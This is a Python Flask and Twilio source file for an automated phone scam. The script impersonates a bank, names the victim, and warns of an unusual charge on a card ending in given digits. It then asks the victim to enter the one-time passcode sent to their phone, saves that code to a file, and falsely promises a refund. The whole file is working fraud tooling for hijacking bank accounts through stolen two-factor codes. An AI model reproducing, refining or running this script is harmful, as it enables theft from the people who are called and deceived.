#!/usr/bin/python -u
from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Redirect
import os
from twilio.rest import Client

app = Flask(__name__)

bank = open('bank.txt', 'r').read()
name = open('name.txt', 'r').read()
last4 = open('last4.txt', 'r').read()
amt = open('amt.txt', 'r').read()

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello, This is {bank} calling about an unusual charge on your credit or debit card.")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say(f'if this is, {name} , please press 1, otherwise., please hang up')
    resp.append(gather)
    return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        # Get which digit the caller chose
        choice = request.values['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':
            gatherotp = Gather(num_digits=6, action='/writeotp', timeout=120)
            gatherotp.say(f'An unusual transaction in the amount of {amt} has been attempted on your card ending in {last4}, if this was not you, to block this transaction and secure your account please enter the 6 digit one time passcode we have sent to your mobile phone now.')
            resp.append(gatherotp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/gather')

    return str(resp)

@app.route('/writeotp', methods=['GET', 'POST'])
def writeotp():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()
    resp.say(f'Thank you, Your account is now secure, Any transactions shown on your account will be reversed and refunded, it will take up to 24 hours to process and show in your account. No further action is needed. Good bye. ')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        a = open('otp.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        return str(resp)
        
if __name__ == "__main__":
    app.run(debug=True)